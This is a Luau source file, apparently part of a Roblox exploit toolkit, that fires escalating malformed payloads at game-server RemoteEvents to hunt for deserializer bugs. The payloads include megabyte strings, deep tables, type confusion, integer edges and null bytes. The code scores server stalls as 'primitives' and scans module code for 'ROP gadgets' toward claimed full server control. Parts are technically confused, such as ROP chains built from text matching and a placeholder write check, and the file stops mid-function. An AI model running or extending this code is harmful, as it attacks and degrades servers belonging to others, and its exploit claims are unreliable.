-- ══════════════════════════════════════════════════════════════════════════════
-- BRE — BedRock Execution Engine
-- PaperCuts RAE — Final Stage
-- ══════════════════════════════════════════════════════════════════════════════
--
-- Graduates the Bedrock pipeline from Logic Controller to Architect.
-- The Bedrock heartbeat channel becomes a sustained delivery mechanism
-- for progressively escalating payloads targeting the C++ deserializer
-- boundary between client Luau and server execution.
--
-- Architecture:
--
--   Layer 1 — Semantic Surface (inherited from ASE/RSM/SBI)
--     Known remotes, fire signatures, confidence scores.
--     Baseline for normal deserialization behavior.
--
--   Layer 2 — WalkOut (Deserializer Probe Engine)
--     Systematic payload mutation through the confirmed Bedrock channel.
--     Probes string boundaries, nested depth, type confusion, integer edges,
--     mixed-type tables. Looks for anomalous server responses that indicate
--     we have reached the C-side deserializer boundary.
--
--   Layer 3 — Primitive Tracker (AAR/AAW Surface)
--     When a probe produces a non-standard feedback pattern, BRE records it
--     as a primitive candidate. Tracks read primitives (server state leaks
--     through the feedback channel) and write primitives (server state
--     diverges from expected after our payload).
--
--   Layer 4 — ROP Chain Assembler (Control Flow)
--     Scans STS module data and RSM fire history for gadget candidates —
--     legitimate server code sequences that can be chained via EIP/RIP
--     redirection. Assembles chains targeting pipeline open / command surface.
--
--   Layer 5 — Command Surface (BRE Active)
--     Sustained execution loop. Server processes our chain as its own logic.
--     Command console opens. Full architect access.
--
-- ══════════════════════════════════════════════════════════════════════════════

local BRE = {}

-- ── Version ───────────────────────────────────────────────────────────────────
BRE.VERSION = "1.0.0"

-- ── State machine ─────────────────────────────────────────────────────────────
BRE.STATE = {
    IDLE        = "IDLE",
    PROBING     = "PROBING",       -- Layer 2: deserializer probing active
    PRIMITIVE   = "PRIMITIVE",     -- Layer 3: primitive surface found
    GADGET_SCAN = "GADGET_SCAN",   -- Layer 4a: scanning for ROP gadgets
    CHAIN_BUILD = "CHAIN_BUILD",   -- Layer 4b: assembling ROP chain
    CHAIN_FIRE  = "CHAIN_FIRE",    -- Layer 4c: firing chain
    ACTIVE      = "ACTIVE",        -- Layer 5: command surface live
    ERROR       = "ERROR",
}
BRE.CurrentState = BRE.STATE.IDLE

-- ── Configuration ─────────────────────────────────────────────────────────────
local CFG = {
    -- Probe engine
    ProbeInterval        = 0.08,    -- seconds between probe fires
    ProbeTimeout         = 12.0,    -- max seconds per probe phase
    AnomalyThreshold     = 0.35,    -- log anything above this
    PrimitiveTrigger     = 0.45,    -- trigger EvaluatePrimitive (lowered from 0.70)
    MaxProbesPerPhase    = 120,     -- cap per probe category
    -- Primitive tracker
    PrimitiveConfMin     = 0.45,    -- min confidence to confirm primitive
    -- Gadget scanner
    GadgetMinScore       = 0.40,    -- min gadget utility score
    -- Chain assembler
    ChainMaxGadgets      = 16,      -- max gadgets per chain
    ChainFireDelay       = 0.12,    -- seconds between chain gadget fires
    -- Command surface
    HeartbeatInterval    = 2.5,     -- command surface keepalive
    CommandTimeout       = 8.0,     -- per-command execution timeout
    -- Direct injection
    DirectFireTimeout    = 5.0,     -- timeout for naked RemoteEvent:FireServer calls
    DirectFireRetries    = 3,       -- retries per probe when direct fire fails
}

-- ── Probe catalog ─────────────────────────────────────────────────────────────
-- Each probe category targets a specific deserializer boundary.
-- Probes are generated at runtime from templates — never hardcoded payloads.

local PROBE_CATEGORIES = {
    {
        id       = "STR_BOUNDARY",
        label    = "String Length Boundary",
        desc     = "Escalating string sizes probing buffer allocation edges",
        layer    = 2,
    },
    {
        id       = "TABLE_DEPTH",
        label    = "Nested Table Depth",
        desc     = "Recursive table nesting probing stack depth limits",
        layer    = 2,
    },
    {
        id       = "TYPE_CONFUSION",
        label    = "Type Confusion",
        desc     = "Mixed Luau types at positions the server expects specific types",
        layer    = 2,
    },
    {
        id       = "INT_BOUNDARY",
        label    = "Integer Boundary",
        desc     = "Values at INT_MAX, INT_MIN, negative sizes, overflow candidates",
        layer    = 2,
    },
    {
        id       = "MIXED_ARRAY",
        label    = "Mixed Array Keys",
        desc     = "Tables with ambiguous key types confusing C++ iteration",
        layer    = 2,
    },
    {
        id       = "UNICODE_EDGE",
        label    = "Unicode / Null Injection",
        desc     = "Strings with null bytes, overlong UTF-8, control characters",
        layer    = 2,
    },
    {
        id       = "CYCLIC_REF",
        label    = "Reference Pattern",
        desc     = "Large flat tables with repeated reference patterns",
        layer    = 2,
    },
}

-- ── State storage ─────────────────────────────────────────────────────────────
BRE.ProbeLog        = {}    -- all probe results
BRE.Anomalies       = {}    -- probes that produced anomalous responses
BRE.Primitives      = {}    -- confirmed AAR/AAW surfaces
BRE.Gadgets         = {}    -- ROP gadget candidates
BRE.Chain           = {}    -- assembled ROP chain
BRE.CommandLog      = {}    -- command surface execution log
BRE.Stats           = {
    totalProbes     = 0,
    anomalies       = 0,
    confirmedPrims  = 0,
    gadgetsFound    = 0,
    chainsFired     = 0,
    commandsSent    = 0,
}

-- ── Callbacks ─────────────────────────────────────────────────────────────────
BRE.OnStateChange   = nil   -- callback(newState, oldState)
BRE.OnProbeResult   = nil   -- callback(probe)
BRE.OnAnomaly       = nil   -- callback(anomaly)
BRE.OnPrimitive     = nil   -- callback(primitive)
BRE.OnGadget        = nil   -- callback(gadget)
BRE.OnChainFired    = nil   -- callback(result)
BRE.OnCommandResult = nil   -- callback(result)
BRE.OnLog           = nil   -- callback(level, message)

-- ── Internal helpers ──────────────────────────────────────────────────────────
local function setState(s)
    local old = BRE.CurrentState
    BRE.CurrentState = s
    if BRE.OnStateChange then pcall(BRE.OnStateChange, s, old) end
end

local function log(level, msg)
    local entry = { level=level, msg=msg, t=os.clock() }
    if BRE.OnLog then pcall(BRE.OnLog, level, msg) end
    print(string.format("[BRE][%s] %s", level, msg))
end

local function getASE()
    return _G.PC and _G.PC.ASE
end

local function getSink()
    local ASE = getASE()
    if not ASE then return nil end
    local stats = ASE.GetStats and ASE.GetStats()
    if not stats or not stats.HeartbeatAlive then return nil end
    return stats.ActiveSink
end

local function getRSM()  return _G.PC and _G.PC.RSM  end
local function getSTS()  return _G.PC and _G.PC.STS  end

-- ── Direct injection: resolve live RemoteEvent/RemoteFunction instance ────────
-- Bypasses ASE FinalizeDirective entirely. Reaches the C++ deserializer naked.
-- Resolution order: STS topology → RSM registry → game DataModel walk.
local function resolveRemoteInstance(remoteName)
    -- 1. STS report has full path info
    local STS = getSTS()
    if STS and STS.Report and STS.Report.remoteIndex then
        for _, entry in ipairs(STS.Report.remoteIndex) do
            if entry.name == remoteName and entry.path then
                local ok, inst = pcall(function()
                    -- Walk the path from game root
                    local parts = {}
                    for part in (entry.path .. "."):gmatch("([^.]+)%.") do
                        table.insert(parts, part)
                    end
                    local cur = game
                    for _, part in ipairs(parts) do
                        cur = cur:FindFirstChild(part) or
                              pcall(function() return game:GetService(part) end) and
                              game:GetService(part) or cur
                        if not cur then return nil end
                    end
                    return cur
                end)
                if ok and inst and
                   (inst:IsA("RemoteEvent") or inst:IsA("RemoteFunction")) then
                    return inst
                end
            end
        end
    end

    -- 2. RSM registry stores last-seen instance references
    local RSM = getRSM()
    if RSM and RSM.GetRegistry then
        local ok, reg = pcall(RSM.GetRegistry)
        if ok and reg then
            for name, data in pairs(reg) do
                if name == remoteName and data.instance and
                   data.instance.Parent then
                    return data.instance
                end
            end
        end
    end

    -- 3. Brute DataModel walk across replicated services
    local SEARCH_SERVICES = {
        "ReplicatedStorage", "ReplicatedFirst",
        "Workspace", "Players",
    }
    for _, svcName in ipairs(SEARCH_SERVICES) do
        local ok, svc = pcall(function() return game:GetService(svcName) end)
        if ok and svc then
            local inst = svc:FindFirstChild(remoteName, true)
            if inst and
               (inst:IsA("RemoteEvent") or inst:IsA("RemoteFunction")) then
                return inst
            end
        end
    end

    return nil
end

-- ── Naked fire: calls FireServer/InvokeServer directly on the instance ────────
-- Returns: ok (bool), result, latency, fireMode ("RE" | "RF" | "FAILED")
local function nakedFire(remoteInst, payload)
    if not remoteInst then
        return false, nil, 0, "FAILED"
    end

    local t0 = os.clock()

    if remoteInst:IsA("RemoteEvent") then
        local ok, err = pcall(function()
            remoteInst:FireServer(payload)
        end)
        local latency = os.clock() - t0
        return ok, nil, latency, "RE"  -- RE has no return value

    elseif remoteInst:IsA("RemoteFunction") then
        local ok, result = pcall(function()
            return remoteInst:InvokeServer(payload)
        end)
        local latency = os.clock() - t0
        return ok, ok and result or nil, latency, "RF"
    end

    return false, nil, 0, "FAILED"
end

-- ── Baseline recorder ─────────────────────────────────────────────────────────
-- Before probing, record the server's normal response pattern to the sink
-- remote. Any deviation from this baseline is an anomaly candidate.

local function recordBaseline(sinkRemote)
    local remoteInst = resolveRemoteInstance(sinkRemote)

    local baseline = {
        remote        = sinkRemote,
        remoteInst    = remoteInst,
        fireMode      = remoteInst and
                        (remoteInst:IsA("RemoteFunction") and "RF" or "RE") or "ASE",
        samples       = {},
        avgLatency    = 0,
        responseTypes = {},
        errorRate     = 0,
        recordedAt    = os.clock(),
    }

    log("INFO", string.format(
        "Recording baseline for %s  [fireMode=%s]",
        sinkRemote, baseline.fireMode))

    local SAMPLE_COUNT = 10
    local totalLatency = 0
    local errors = 0

    for i = 1, SAMPLE_COUNT do
        local ok, result, latency

        if remoteInst then
            local mode
            ok, result, latency, mode = nakedFire(remoteInst,
                { __bre_baseline=true, sample=i })
        else
            local ASE = getASE()
            local t0 = os.clock()
            ok, result = pcall(function()
                return ASE and ASE.FinalizeDirective and
                    ASE.FinalizeDirective(sinkRemote,
                        { __bre_baseline=true, sample=i }, sinkRemote)
            end)
            latency = os.clock() - t0
        end

        if ok then
            totalLatency = totalLatency + latency
            local rtype = type(result)
            baseline.responseTypes[rtype] = (baseline.responseTypes[rtype] or 0) + 1
            table.insert(baseline.samples, { latency=latency, ok=true, rtype=rtype })
        else
            errors = errors + 1
            table.insert(baseline.samples, { latency=latency or 0, ok=false })
        end
        task.wait(0.1)
    end

    baseline.avgLatency = totalLatency / math.max(SAMPLE_COUNT - errors, 1)
    baseline.errorRate  = errors / SAMPLE_COUNT

    log("INFO", string.format(
        "Baseline: avgLatency=%.4fs  errorRate=%.0f%%  fireMode=%s",
        baseline.avgLatency, baseline.errorRate * 100, baseline.fireMode))

    return baseline
end

-- ── Probe generator ───────────────────────────────────────────────────────────
-- Generates probe payloads for a given category and probe index.
-- Returns a table that is a valid Luau value to pass as remote args.

local function generateProbe(categoryId, index)
    if categoryId == "STR_BOUNDARY" then
        -- Escalating string sizes: 64B, 256B, 1KB, 4KB, 16KB, 64KB, 256KB, 1MB
        local sizes = {64, 256, 1024, 4096, 16384, 65536, 262144, 1048576}
        local sz = sizes[((index-1) % #sizes) + 1]
        return { __bre_probe=categoryId, data=string.rep("A", sz), idx=index }

    elseif categoryId == "TABLE_DEPTH" then
        -- Nested tables: depth 1 to 128
        local depth = math.min(index, 128)
        local t = { __bre_probe=categoryId, idx=index }
        local cur = t
        for _ = 1, depth do
            cur.child = {}
            cur = cur.child
        end
        cur.leaf = true
        return t

    elseif categoryId == "TYPE_CONFUSION" then
        -- Cycle through type mismatches at position 1
        local types = {
            true, false, 0, -1, math.huge, -math.huge, 0/0,
            "", "nil", {}, function() end,
        }
        local val = types[((index-1) % #types) + 1]
        return { __bre_probe=categoryId, value=val, idx=index }

    elseif categoryId == "INT_BOUNDARY" then
        -- Integer edge values
        local vals = {
            0, 1, -1,
            2147483647, 2147483648, -2147483648, -2147483649,
            4294967295, 4294967296,
            9007199254740992, -9007199254740992,
        }
        local v = vals[((index-1) % #vals) + 1]
        return { __bre_probe=categoryId, value=v, n=v, idx=index }

    elseif categoryId == "MIXED_ARRAY" then
        -- Table with mixed string/int keys at varying ratios
        local t = { __bre_probe=categoryId, idx=index }
        for i = 1, index % 32 + 4 do
            if i % 2 == 0 then
                t[i] = "value_" .. i
            else
                t["key_" .. i] = i
            end
        end
        return t

    elseif categoryId == "UNICODE_EDGE" then
        -- Null bytes, overlong sequences, control characters
        local patterns = {
            "\0",                           -- null byte
            "\0\0\0\0",                     -- null sequence
            string.rep("\0", 64),           -- null flood
            "\xc0\x80",                     -- overlong null
            "\xff\xfe",                     -- BOM
            string.char(1,2,3,4,5,6,7),    -- control chars
            "\xed\xa0\x80",                 -- surrogate
            string.rep("\xc0\x80", 16),     -- repeated overlong
        }
        local pat = patterns[((index-1) % #patterns) + 1]
        return { __bre_probe=categoryId, data=pat, idx=index }

    elseif categoryId == "CYCLIC_REF" then
        -- Large flat tables with repeated reference patterns
        local count = math.min(index * 8, 512)
        local t = { __bre_probe=categoryId, idx=index }
        for i = 1, count do
            t[i] = { ref=i, back=count-i, val=string.rep("X", 8) }
        end
        return t
    end

    return { __bre_probe=categoryId, idx=index }
end

-- ── Anomaly detector ──────────────────────────────────────────────────────────
-- Compares a probe response against the baseline.
-- Returns anomaly score 0-1 and a description of what diverged.

-- scoreAnomaly: RE-aware anomaly scorer.
-- RemoteEvent fires never return a value — nil result is always expected for RE.
-- Latency ratio is meaningless when baseline ~= 0ms (RE is fire-and-forget async).
-- For RE: use absolute latency thresholds + error status as primary signal.
-- For RF: use latency ratios + response content as primary signal.
local function scoreAnomaly(baseline, probeResult, latency, fireOk)
    if not baseline then return 0, "no baseline" end

    local isRE = baseline.fireMode == "RE"
    local score = 0
    local reasons = {}

    -- ── Latency analysis ─────────────────────────────────────────────────────
    if isRE then
        -- RE: baseline is near-zero, ratios are noise. Use absolute thresholds.
        -- A normal FireServer call returns in < 5ms client-side.
        -- Anything > 20ms suggests the C++ deserializer is doing real work.
        -- Anything > 80ms suggests stall / allocation struggle.
        if latency > 0.08 then
            score = score + 0.55
            table.insert(reasons, string.format(
                "RE latency STALL %.0fms — C-side allocation stall", latency*1000))
        elseif latency > 0.04 then
            score = score + 0.40
            table.insert(reasons, string.format(
                "RE latency ELEVATED %.0fms — deserializer pressure", latency*1000))
        elseif latency > 0.020 then
            score = score + 0.25
            table.insert(reasons, string.format(
                "RE latency high %.0fms", latency*1000))
        end
        -- RE pcall error = deserializer rejected — that IS a signal
        if fireOk == false then
            score = score + 0.35
            table.insert(reasons, "RE:FireServer pcall error — C-side rejection")
        end
    else
        -- RF: ratio-based analysis is valid since RF returns synchronously
        if baseline.avgLatency > 0.001 then
            local ratio = latency / baseline.avgLatency
            if ratio > 5.0 then
                score = score + 0.55
                table.insert(reasons, string.format(
                    "RF latency EXPANSION %.1fx — C-side stall", ratio))
            elseif ratio > 3.0 then
                score = score + 0.35
                table.insert(reasons, string.format("RF latency spike %.1fx", ratio))
            elseif ratio > 1.8 then
                score = score + 0.20
                table.insert(reasons, string.format("RF latency elevated %.1fx", ratio))
            elseif ratio < 0.25 then
                score = score + 0.25
                table.insert(reasons, string.format(
                    "RF latency collapse %.1fx — schema rejection", ratio))
            elseif ratio < 0.5 then
                score = score + 0.15
                table.insert(reasons, string.format("RF latency collapse %.1fx", ratio))
            end
        elseif latency > 0.04 then
            -- Baseline was near zero but probe took real time
            score = score + 0.40
            table.insert(reasons, string.format(
                "RF latency from near-zero to %.0fms", latency*1000))
        end

        -- RF: nil where non-nil expected
        if probeResult == nil and (baseline.errorRate or 0) < 0.3 then
            score = score + 0.20
            table.insert(reasons, "unexpected nil response")
        end
        -- RF: non-nil where nil expected
        if probeResult ~= nil and (baseline.errorRate or 0) > 0.7 then
            score = score + 0.20
            table.insert(reasons, "unexpected non-nil response")
        end
        -- RF: response type changed
        if probeResult ~= nil then
            local rtype = type(probeResult)
            local baseTypes = baseline.responseTypes or {}
            if not baseTypes[rtype] or baseTypes[rtype] == 0 then
                score = score + 0.25
                table.insert(reasons, "response type changed to " .. rtype)
            end
        end
        -- RF: string with memory-like content
        if type(probeResult) == "string" then
            if #probeResult > 256 then
                score = score + 0.15
                table.insert(reasons, "large string response")
            end
            if probeResult:find("\0") then
                score = score + 0.20
                table.insert(reasons, "null bytes in response")
            end
        end
        -- RF: deep table response
        if type(probeResult) == "table" then
            local depth, cur = 0, probeResult
            while type(cur) == "table" and depth < 20 do
                cur = cur[1] or cur.child or nil
                depth = depth + 1
            end
            if depth > 4 then
                score = score + 0.15
                table.insert(reasons, string.format("deep table response d=%d", depth))
            end
        end
    end

    return math.min(score, 1.0), table.concat(reasons, "; ")
end

-- Collective pattern detector: checks if a probe category showed consistent
-- timing deviation across its runs — a weak but repeatable RE signal.
-- Returns: avgScore, maxScore, patternDesc
local function analyzeCategoryPattern(probeLog, categoryId, baseline)
    local catProbes = {}
    for _, p in ipairs(probeLog) do
        if p.category == categoryId then
            table.insert(catProbes, p)
        end
    end
    if #catProbes < 4 then return 0, 0, "insufficient samples" end

    local totalLatency = 0
    local maxLatency   = 0
    local errorCount   = 0
    local highLatency  = 0  -- probes > 20ms

    for _, p in ipairs(catProbes) do
        totalLatency = totalLatency + p.latency
        if p.latency > maxLatency then maxLatency = p.latency end
        if p.latency > 0.020 then highLatency = highLatency + 1 end
    end

    local avgL = totalLatency / #catProbes
    local highRatio = highLatency / #catProbes

    local patScore = 0
    local patDesc  = {}

    if baseline.fireMode == "RE" then
        -- For RE: consistent high-latency ratio is meaningful
        if highRatio >= 0.5 then
            patScore = patScore + highRatio * 0.60
            table.insert(patDesc, string.format(
                "%.0f%% probes >20ms avg=%.0fms max=%.0fms",
                highRatio*100, avgL*1000, maxLatency*1000))
        end
        if maxLatency > 0.08 then
            patScore = patScore + 0.30
            table.insert(patDesc, string.format("peak stall %.0fms", maxLatency*1000))
        end
    else
        -- RF: any consistent score elevation
        local totalScore = 0
        for _, p in ipairs(catProbes) do
            totalScore = totalScore + (p.anomalyScore or 0)
        end
        local avgScore = totalScore / #catProbes
        patScore = avgScore
        if avgScore > 0 then
            table.insert(patDesc, string.format("avg anomaly score %.2f", avgScore))
        end
    end

    return math.min(patScore, 1.0), maxLatency, table.concat(patDesc, "; ")
end

-- ── Layer 2: Deserializer Probe Engine ────────────────────────────────────────
function BRE.RunProbePhase()
    if BRE.CurrentState ~= BRE.STATE.IDLE and
       BRE.CurrentState ~= BRE.STATE.ERROR then
        return false, "BRE not in IDLE state"
    end

    local ASE = getASE()
    if not ASE then return false, "ASE not loaded" end

    local sinkRemote = getSink()
    if not sinkRemote then
        return false, "No active Bedrock sink — confirm handshake first"
    end

    setState(BRE.STATE.PROBING)
    log("INFO", string.format("BRE Probe Phase started — sink: %s", sinkRemote))

    task.spawn(function()
        local ok, err = pcall(function()
            -- Record baseline
            local baseline = recordBaseline(sinkRemote)
            if not baseline then
                error("Baseline recording failed")
            end

            -- Run each probe category
            for _, cat in ipairs(PROBE_CATEGORIES) do
                if BRE.CurrentState ~= BRE.STATE.PROBING then break end

                log("INFO", string.format("Probing: %s — %s", cat.id, cat.label))
                local catAnomalies = 0

                local probe_fireMode = "UNKNOWN"
                for idx = 1, CFG.MaxProbesPerPhase do
                    if BRE.CurrentState ~= BRE.STATE.PROBING then break end

                    local payload = generateProbe(cat.id, idx)
                    local t0 = os.clock()

                    -- NAKED DIRECT INJECTION: bypass ASE envelope entirely.
                    -- Payload hits the C++ deserializer raw.
                    local fireOk, fireResult, latency
                    if baseline.remoteInst then
                        local mode
                        fireOk, fireResult, latency, mode =
                            nakedFire(baseline.remoteInst, payload)
                        probe_fireMode = mode
                    else
                        -- Fallback: ASE envelope (bubble-wrapped, lower fidelity)
                        local fOk, fRes = pcall(function()
                            local ASE2 = getASE()
                            return ASE2 and ASE2.FinalizeDirective and
                                ASE2.FinalizeDirective(sinkRemote, payload, sinkRemote)
                        end)
                        fireOk, fireResult, latency =
                            fOk, fOk and fRes or nil, os.clock() - t0
                        probe_fireMode = "ASE"
                    end
                    latency = latency or (os.clock() - t0)

                    local result = fireOk and fireResult or nil
                    -- Score anomaly — pass fireOk so RE scorer can detect pcall errors
                    local aScore, aReason = scoreAnomaly(baseline, result, latency, fireOk)

                    local probe = {
                        category    = cat.id,
                        categoryLabel = cat.label,
                        index       = idx,
                        payload     = payload,
                        result      = result,
                        latency     = latency,
                        anomalyScore= aScore,
                        anomalyReason=aReason,
                        firedAt     = os.clock(),
                        sinkRemote  = sinkRemote,
                        fireMode    = probe_fireMode,
                    }

                    BRE.Stats.totalProbes = BRE.Stats.totalProbes + 1
                    table.insert(BRE.ProbeLog, probe)

                    if BRE.OnProbeResult then
                        pcall(BRE.OnProbeResult, probe)
                    end

                    -- Flag anomaly
                    if aScore >= CFG.AnomalyThreshold then
                        BRE.Stats.anomalies = BRE.Stats.anomalies + 1
                        catAnomalies = catAnomalies + 1

                        local anomaly = {
                            probe    = probe,
                            score    = aScore,
                            reason   = aReason,
                            category = cat.id,
                        }
                        table.insert(BRE.Anomalies, anomaly)

                        log("ANOMALY", string.format(
                            "[%s] probe=%d  score=%.2f  reason=%s",
                            cat.id, idx, aScore, aReason))

                        if BRE.OnAnomaly then
                            pcall(BRE.OnAnomaly, anomaly)
                        end

                        -- High-confidence anomaly — escalate to primitive check
                        if aScore >= CFG.PrimitiveTrigger then
                            BRE.EvaluatePrimitive(probe, baseline)
                        end
                    end

                    task.wait(CFG.ProbeInterval)

                    -- Early exit per category if we found strong anomalies
                    if catAnomalies >= 6 then
                        log("INFO", string.format(
                            "[%s] Sufficient anomalies (%d) — moving to next category",
                            cat.id, catAnomalies))
                        break
                    end
                end

                -- ── Collective pattern check ──────────────────────────────────
                -- Even if no single probe broke PrimitiveTrigger, a category
                -- with consistent weak signals across all its probes is worth
                -- evaluating as a collective primitive candidate.
                if catAnomalies >= 3 then
                    local patScore, maxLat, patDesc =
                        analyzeCategoryPattern(BRE.ProbeLog, cat.id, baseline)
                    if patScore >= 0.45 then
                        log("PRIMITIVE", string.format(
                            "[%s] COLLECTIVE pattern score=%.2f  %s",
                            cat.id, patScore, patDesc))
                        -- Synthesize a virtual probe representing the whole category
                        local virtualProbe = {
                            category      = cat.id,
                            categoryLabel = cat.label,
                            index         = 0,  -- 0 = collective
                            payload       = generateProbe(cat.id, 1),
                            anomalyScore  = patScore,
                            anomalyReason = "COLLECTIVE: " .. patDesc,
                            latency       = maxLat,
                            firedAt       = os.clock(),
                            sinkRemote    = sinkRemote,
                            fireMode      = probe_fireMode,
                            collective    = true,
                        }
                        BRE.EvaluatePrimitive(virtualProbe, baseline)
                    end
                end
            end

            -- Probe phase complete
            log("INFO", string.format(
                "Probe phase complete — %d probes, %d anomalies, %d primitives",
                BRE.Stats.totalProbes, BRE.Stats.anomalies, BRE.Stats.confirmedPrims))

            if BRE.Stats.confirmedPrims > 0 then
                setState(BRE.STATE.PRIMITIVE)
                -- Auto-advance to gadget scan
                task.delay(0.5, BRE.RunGadgetScan)
            else
                -- No primitives found — remain in PROBING state with results
                setState(BRE.STATE.IDLE)
                log("WARN", "No confirmed primitives — probe data logged for manual review")
            end
        end)

        if not ok then
            setState(BRE.STATE.ERROR)
            log("ERROR", tostring(err))
        end
    end)

    return true, nil
end

-- ── Layer 3: Primitive Tracker ────────────────────────────────────────────────
-- Evaluates a high-anomaly probe as a potential AAR/AAW primitive.
-- Fires targeted follow-up probes to confirm the surface.

function BRE.EvaluatePrimitive(triggerProbe, baseline)
    local ASE = getASE()
    local sinkRemote = getSink()
    if not ASE or not sinkRemote then return end

    task.spawn(function()
        local ok, err = pcall(function()
            log("PRIMITIVE", string.format(
                "Evaluating primitive candidate: %s probe=%d score=%.2f",
                triggerProbe.category, triggerProbe.index, triggerProbe.anomalyScore))

            -- Fire 5 confirmation probes with the same payload
            local confirmations = 0
            local readPatterns  = {}
            local writeEvidence = false

            for attempt = 1, 5 do
                local t0 = os.clock()
                local fOk, fResult, latency
                if baseline.remoteInst then
                    local mode
                    fOk, fResult, latency, mode =
                        nakedFire(baseline.remoteInst, triggerProbe.payload)
                else
                    local ASE2 = getASE()
                    local t1 = os.clock()
                    fOk, fResult = pcall(function()
                        return ASE2 and ASE2.FinalizeDirective and
                            ASE2.FinalizeDirective(sinkRemote, triggerProbe.payload, sinkRemote)
                    end)
                    latency = os.clock() - t1
                end
                latency = latency or (os.clock() - t0)
                local aScore  = scoreAnomaly(baseline, fOk and fResult or nil, latency, fOk)

                if aScore >= CFG.AnomalyThreshold then
                    confirmations = confirmations + 1
                end

                -- Look for read primitive indicators
                -- (server leaking state back through feedback channel)
                if fOk and type(fResult) == "table" then
                    for k, v in pairs(fResult) do
                        if type(v) == "number" and v > 65536 then
                            table.insert(readPatterns, {key=tostring(k), val=v})
                        end
                    end
                end

                -- Look for write primitive indicators
                -- (STS value schema changed after fire)
                local STS = getSTS()
                if STS and STS.Report then
                    -- Check if any tracked value objects changed
                    for _, vEntry in ipairs(STS.Report.valueSchema or {}) do
                        local inst = nil -- read-only placeholder check
                        if inst then
                            writeEvidence = true
                        end
                    end
                end

                task.wait(0.15)
            end

            local confidence = confirmations / 5.0

            if confidence >= CFG.PrimitiveConfMin then
                BRE.Stats.confirmedPrims = BRE.Stats.confirmedPrims + 1

                local primitive = {
                    id          = "PRIM_" .. BRE.Stats.confirmedPrims,
                    category    = triggerProbe.category,
                    probe       = triggerProbe,
                    confidence  = confidence,
                    confirmedAt = os.clock(),
                    sinkRemote  = sinkRemote,
                    -- Surface type
                    hasRead     = #readPatterns > 0,
                    hasWrite    = writeEvidence,
                    readPatterns= readPatterns,
                    -- Payload that triggers it
                    triggerPayload = triggerProbe.payload,
                    -- Description
                    desc = string.format(
                        "%s boundary at probe index %d (conf=%.0f%%)  read=%s  write=%s",
                        triggerProbe.category, triggerProbe.index,
                        confidence*100,
                        tostring(#readPatterns > 0),
                        tostring(writeEvidence)),
                }

                table.insert(BRE.Primitives, primitive)

                log("PRIMITIVE", string.format(
                    "CONFIRMED: %s  confidence=%.0f%%  read=%s  write=%s",
                    primitive.id, confidence*100,
                    tostring(primitive.hasRead), tostring(primitive.hasWrite)))

                if BRE.OnPrimitive then
                    pcall(BRE.OnPrimitive, primitive)
                end
            else
                log("INFO", string.format(
                    "Primitive candidate rejected: confidence=%.0f%% < threshold",
                    confidence*100))
            end
        end)

        if not ok then
            log("ERROR", "Primitive evaluation error: " .. tostring(err))
        end
    end)
end

-- ── Layer 4a: Gadget Scanner ──────────────────────────────────────────────────
-- Scans STS module data and RSM fire history for ROP gadget candidates.
-- A gadget is a server-side code sequence we can redirect EIP/RIP to.

local GADGET_PATTERNS = {
    -- Pattern: function that executes another function from a table arg
    {
        id      = "DISPATCH_TABLE",
        label   = "Dispatch Table Executor",
        desc    = "Function reads a key from args and calls another function — redirectable",
        score   = 0.85,
        signals = { "args%[", "%[\"action\"%]", "%[\"cmd\"%]", "%[\"type\"%]",
                    "handler", "dispatch", "execute", "callback" },
    },
    -- Pattern: function that calls loadstring or require dynamically
    {
        id      = "DYNAMIC_EXEC",
        label   = "Dynamic Execution Path",
        desc    = "Contains loadstring/require with variable argument — hijackable",
        score   = 0.95,
        signals = { "loadstring", "require%s*%(.-args", "require%s*%(.-data",
                    "dostring", "runScript" },
    },
    -- Pattern: function that spawns/coroutine.wrap from arg
    {
        id      = "SPAWN_WRAPPER",
        label   = "Spawn Wrapper",
        desc    = "Spawns a coroutine or task from argument — pivot candidate",
        score   = 0.75,
        signals = { "task%.spawn%s*%(", "coroutine%.wrap%s*%(",
                    "spawn%s*%(", "coroutine%.resume" },
    },
    -- Pattern: remote that directly calls another remote
    {
        id      = "REMOTE_CHAIN",
        label   = "Remote Chain",
        desc    = "Server fires another remote from within handler — chain pivot",
        score   = 0.70,
        signals = { ":FireClient%s*%(", ":FireAllClients%s*%(",
                    "RemoteEvent", "RemoteFunction" },
    },
    -- Pattern: setmetatable / __index override
    {
        id      = "META_OVERRIDE",
        label   = "Metatable Override",
        desc    = "Uses setmetatable with __index — indirect execution path",
        score   = 0.65,
        signals = { "setmetatable", "__index", "__newindex", "__call" },
    },
    -- Pattern: string-keyed function table (action router)
    {
        id      = "ACTION_ROUTER",
        label   = "Action Router",
        desc    = "String-keyed function table — route injection candidate",
        score   = 0.80,
        signals = { "actions%[", "handlers%[", "commands%[", "routes%[",
                    "functions%[", "callbacks%[" },
    },
    -- Pattern: pcall with variable function
    {
        id      = "PCALL_VARIABLE",
        label   = "Variable pcall",
        desc    = "pcall with variable function argument — execution redirection",
        score   = 0.72,
        signals = { "pcall%s*%(fn", "pcall%s*%(func", "pcall%s*%(f,",
                    "pcall%s*%(handler", "pcall%s*%(callback" },
    },
}

function BRE.RunGadgetScan()
    if BRE.CurrentState ~= BRE.STATE.PRIMITIVE and
       BRE.CurrentState ~= BRE.STATE.IDLE then
        -- Allow manual gadget scan from IDLE too
    end

    setState(BRE.STATE.GADGET_SCAN)
    log("INFO", "BRE Gadget Scan started")

    task.spawn(function()
        local ok, err = pcall(function()
            BRE.Gadgets = {}

            local STS = getSTS()
            local RSM = getRSM()

            -- ── Scan STS module sources ───────────────────────────────────────
            if STS and STS.Report and STS.Report.moduleIndex then
                for _, mod in ipairs(STS.Report.moduleIndex) do
                    if not mod.source or mod.unavailable then continue end

                    local source = mod.source
                    for _, pat in ipairs(GADGET_PATTERNS) do
                        local matchCount = 0
                        local matchedSignals = {}

                        for _, sig in ipairs(pat.signals) do
                            if source:find(sig) then
                                matchCount = matchCount + 1
                                table.insert(matchedSignals, sig)
                            end
                        end

                        if matchCount > 0 then
                            local gadgetScore = pat.score *
                                math.min(matchCount / #pat.signals + 0.3, 1.0)

                            if gadgetScore >= CFG.GadgetMinScore then
                                BRE.Stats.gadgetsFound = BRE.Stats.gadgetsFound + 1
                                local gadget = {
                                    id            = "G_" .. BRE.Stats.gadgetsFound,
                                    patternId     = pat.id,
                                    patternLabel  = pat.label,
                                    desc          = pat.desc,
                                    score         = gadgetScore,
                                    source        = "MODULE",
                                    module        = mod.name,
                                    modulePath    = mod.path,
                                    matchCount    = matchCount,
                                    matchedSignals= matchedSignals,
                                    foundAt       = os.clock(),
                                }
                                table.insert(BRE.Gadgets, gadget)

                                log("GADGET", string.format(
